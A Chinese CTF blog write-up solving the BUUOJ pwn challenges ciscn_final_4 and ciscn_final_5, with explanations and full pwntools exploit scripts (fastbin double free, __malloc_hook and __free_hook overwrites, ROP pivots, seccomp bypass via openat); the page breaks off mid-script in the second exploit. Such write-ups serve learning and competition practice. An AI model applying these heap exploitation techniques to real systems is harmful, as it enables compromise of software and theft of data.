<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUUOJ 刷题记录(一)"><meta name="keywords" content="BUUOJ,pwn,ciscn_final_4,ciscn_final_5,ciscn_final_6,ciscn_final_8,ciscn_final_9,ciscn_final_10"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>BUUOJ 刷题记录(一) | Nop's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-4"><span class="toc-number">1.</span> <span class="toc-text">ciscn_final_4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-5"><span class="toc-number">2.</span> <span class="toc-text">ciscn_final_5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-1"><span class="toc-number">2.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-6"><span class="toc-number">3.</span> <span class="toc-text">ciscn_final_6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-2"><span class="toc-number">3.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-8"><span class="toc-number">4.</span> <span class="toc-text">ciscn_final_8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-3"><span class="toc-number">4.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-3"><span class="toc-number">4.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">4.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-8-1"><span class="toc-number">5.</span> <span class="toc-text">ciscn_final_8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-4"><span class="toc-number">5.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-4"><span class="toc-number">5.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">5.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-10"><span class="toc-number">6.</span> <span class="toc-text">ciscn_final_10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-5"><span class="toc-number">6.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-5"><span class="toc-number">6.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">6.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://n0nop.com/img/avatar.jpg"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">5</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://n0nop.com/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">BUUOJ 刷题记录(一)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">3.6k</span><span class="post-meta__separator">|</span><span>Reading time: 18 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。</p>
<a id="more"></a>

<h1 id="ciscn-final-4"><a href="#ciscn-final-4" class="headerlink" title="ciscn_final_4"></a>ciscn_final_4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键就在于这个<code>open</code>被禁用，可以用<code>openat</code>代替。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li><code>seccomp-tools dump ciscn_final_4</code>，禁用了<code>execve</code>，显然要orw了。</li>
<li>binary中的<code>watch</code>函数同时也检测了几个系统调用，也就是不能用： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">watch</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+34h] [rbp-ECh]</span></span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">    <span class="keyword">char</span> v3; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+B8h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        waitpid(a1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(stat_loc &amp; <span class="number">0x7F</span>) || (<span class="keyword">char</span>)((stat_loc &amp; <span class="number">0x7F</span>) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v3);</span><br><span class="line">        v2 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">2</span> || v2 == <span class="number">9</span> || v2 == <span class="number">57</span> || v2 == <span class="number">58</span> || v2 == <span class="number">101</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"hey! what are you doing?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 禁用了<code>open</code>(2)，<code>mmap</code>(9)，<code>fork</code>(57)，<code>vfork</code>(58)，<code>ptrace</code>(101)系统调用。</li>
<li>patch掉<code>ptrace(TRACEME, xxx, xxx)</code>，方便调试<code>fork</code>出来的子进程。</li>
<li>明显的fastbin double free，利用unsorted bin来leak出libc地址，之后利用fastbin attack分配到<code>__malloc_hook</code></li>
<li>在<code>__malloc_hook</code>布置如下的gadget，目的是将栈下压0x38字节，此时<code>rsp</code>正好只想binary开始我们输入<code>name</code>的位置，因此是可控的，可以提前布置rop chain。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401186 loc_401186:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000401186                 add     rsp, 8</span><br><span class="line">.text:000000000040118A                 pop     rbx</span><br><span class="line">.text:000000000040118B                 pop     rbp</span><br><span class="line">.text:000000000040118C                 pop     r12</span><br><span class="line">.text:000000000040118E                 pop     r13</span><br><span class="line">.text:0000000000401190                 pop     r14</span><br><span class="line">.text:0000000000401192                 pop     r15</span><br><span class="line">.text:0000000000401194                 retn</span><br></pre></td></tr></table></figure></li>
<li>在binary最开始输入<code>name</code>时布置gadget，完成向bss中写入第二段rop chain，同时将栈迁移到该bss上。</li>
<li>由于<code>open</code>的禁用，故不可用来打开<code>flag</code>文件。因此这里可以使用<code>openat</code>函数，因为<code>open</code>的内部实际上也是通过<code>openat</code>函数实现打开文件的功能的，因此单独调用<code>openat</code>可以绕过<code>open</code>的限制，也能打开文件。</li>
<li>接下来就是orw拿flag了。<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">openat_offset = libc.sym[<span class="string">"openat"</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">"read"</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">"write"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf02a4</span></span><br><span class="line">pop_7regs = <span class="number">0x401186</span> <span class="comment"># add rsp, 8; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401193</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401191</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040118d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdx_offset = <span class="number">0x0000000000001b92</span> <span class="comment"># pop rdx ; ret (in libc)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss, <span class="number">0</span>])</span><br><span class="line">payload += flat([read_plt])</span><br><span class="line">payload += flat([pop_rsp_r13_r14_r15, bss])</span><br><span class="line">p.sendafter(<span class="string">"what is your name? "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">0x500</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">addr = show(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">main_arena = u64(addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line"><span class="comment"># one_gadget = libc_base + one_gadget_offset</span></span><br><span class="line">pop_rdx = libc_base + pop_rdx_offset</span><br><span class="line">libc_openat = libc_base + openat_offset</span><br><span class="line">libc_read = libc_base + read_offset</span><br><span class="line">libc_write = libc_base + write_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">new(<span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x13</span> + p64(pop_7regs))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __malloc_hook</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size?"</span>, str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set gadgets on bss (using orw)</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x100</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0</span>])</span><br><span class="line">payload += flat([libc_openat]) <span class="comment"># open "/flag"</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">3</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_read]) <span class="comment"># read flag</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_write]) <span class="comment"># print flag</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"pop_rdx: "</span> + hex(pop_rdx))</span><br><span class="line">success(<span class="string">"libc_write: "</span> + hex(libc_write))</span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_openat: "</span> + hex(libc_openat))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-5"><a href="#ciscn-final-5" class="headerlink" title="ciscn_final_5"></a>ciscn_final_5</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>经典没有<code>show</code>的题目，bruteforce 4 bits，partial write unsorted bin-&gt;bk为stdout的做法，主要是堆布局需要点时间，写起来有点pwnable.tw上realloc的感觉了，不过显然更简单。</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol>
<li>利用题目储存<code>chunk</code>地址以及<code>index</code>的逻辑是两者异或之后再存入<code>chunk_array</code>中空闲的地方，若<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>，那么就可以在edit的时候，实际写的地址要向后移0x10 bytes，从而可以溢出到下一个chunk的<code>fd</code>的部分。</li>
<li>利用这个溢出，改掉下一个chunk的size，造成更大的chunk overlap，使得一个chunk同时存在tcache bin和unsorted bin中（间接链入unsorted bin）。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsorted bin --&gt; +--------+</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 +--------+                      +--------+ &lt;-- tcache bin</span><br><span class="line">                 |        | &#x3D;&#x3D;&gt; victim_chunk &lt;&#x3D;&#x3D; |        |</span><br><span class="line">                 +--------+                      +--------+</span><br></pre></td></tr></table></figure></li>
<li>由于在切割unsorted bin，使得victim_chunk的fd，bk被置入<code>main_arena+0x58</code>之后，需要进行partial write，故这里仍要需要利用<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>的方法进行0x10 bytes overflow，从从而可以覆盖到<code>victim_chunk-&gt;fd</code>。</li>
<li>分配到<code>stdout</code>的chunk之后，写入<code>p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;</code>就可以leak libc了。</li>
<li>之后继续利用0x10 bytes overflow，分配<code>__free_hook</code>的chunk，写入<code>system</code>，再<code>free</code>一个”/bin/sh”的chunk，就可以getshell了。<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">offset =  <span class="number">0x3eb780</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bruteforce 4 bits</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># prepare two useful chunks</span></span><br><span class="line">        new(<span class="number">10</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line">        new(<span class="number">11</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># first chunk (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create overlap</span></span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        new(<span class="number">3</span>, <span class="number">0xF8</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        new(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">"DDDD"</span>) <span class="comment"># avoid merging to top chunk</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># free the chunk with index 16</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc from unsorted bin (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x3F8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write unsorted bin-&gt;bk ==&gt; stdout</span></span><br><span class="line">        edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x3D8</span> + p64(<span class="number">0x101</span>) + p16(<span class="number">0x5760</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc chunk at stdout</span></span><br><span class="line">        new(<span class="number">5</span>, <span class="number">0xF8</span>, <span 